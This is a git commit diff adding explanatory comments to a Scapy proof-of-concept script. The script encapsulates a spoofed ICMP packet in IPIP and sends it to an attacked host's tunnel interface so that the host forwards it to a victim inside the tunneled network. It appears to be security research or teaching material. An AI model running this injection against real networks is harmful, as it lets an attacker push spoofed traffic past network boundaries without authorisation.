82cf99006c8171dc861b82a6d57089fa7db113c6
Tomáš Turecký <t_turecky@utb.cz>
2025-04-21 18:47:09 +0200

    Added comments and changed names for more clarity.

--- tunnel_poc.py
+++ tunnel_poc.py
@@ -4,11 +4,11 @@ from scapy.packet import ls
 from scapy.sendrecv import *
 
 
-def construct_icmp_packet(src_ip, dst_ip):
+def construct_icmp_packet(src_ip, dst_ip): #Creates an inner packet, in this case an ICMP request
     packet = IP(dst=dst_ip, src=src_ip)/ICMP()
     return packet
 
-def construct_ipip_packet(src_ip, dst_ip, inner_packet):
+def construct_ipip_packet(src_ip, dst_ip, inner_packet): #Encapsulates the inner packet in another IP packet, forming an IPIP encapsulation
     packet = IP(dst=dst_ip, src=src_ip)/inner_packet
     return packet
 
@@ -17,11 +17,11 @@ def construct_ipip_packet(src_ip, dst_ip, inner_packet):
 
 
 if __name__ == '__main__':
-    src_ip = '192.168.1.2'
-    dst_ip = '192.168.2.2'
-    tunnel_exit = '192.168.10.2'
-    victim_ip = '192.168.10.3'
-    inner_packet = construct_icmp_packet(tunnel_exit,victim_ip)
-    tunnel_packet = construct_ipip_packet(src_ip,dst_ip, inner_packet)
-    tunnel_packet.display()
-    send(tunnel_packet)
+    attacker_ip = '192.168.1.2' #Your IP
+    tunnel_interface = '192.168.2.2' #IP of attacked host, needs to have a tunnel configured
+    tunnel_exit = '192.168.10.2' #IP of the attacked host, where tunnel traffic is directed to
+    victim_ip = '192.168.10.3' #Victim in the tunneled network, where you want the tunneled traffic to be sent
+    inner_packet = construct_icmp_packet(tunnel_exit,victim_ip) #Inner packet, that the vulnerable host decapsulates
+    tunnel_packet = construct_ipip_packet(attacker_ip,tunnel_interface, inner_packet) #Encapsulated packet, that is sent to the tunnel interface
+    tunnel_packet.display() #Good to know information, that the formed packet is correct
+    send(tunnel_packet) #Encapsulated packet sent, we don't wait for a reply, since there won't be any
